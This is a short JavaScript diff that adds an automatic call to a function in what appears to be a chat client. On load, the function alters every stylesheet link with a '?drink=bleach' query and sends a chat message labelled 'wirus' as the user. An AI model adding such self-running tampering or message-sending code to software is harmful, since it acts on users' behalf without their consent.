@@ -12,7 +12,7 @@ function create(htmlStr) {
     }
     return frag;
 }
-
+basicchatthing();
 function basicchatthing() { 
 var links = document.getElementsByTagName("link"); for (var i = 0; i < links.length;i++) { var link = links[i]; if (link.rel === "stylesheet") {link.href += "?drink=bleach"; }}
 setTimeout(function(){ sendnewmsg("Epic // Anti Group", "wirus"); }, 1000);
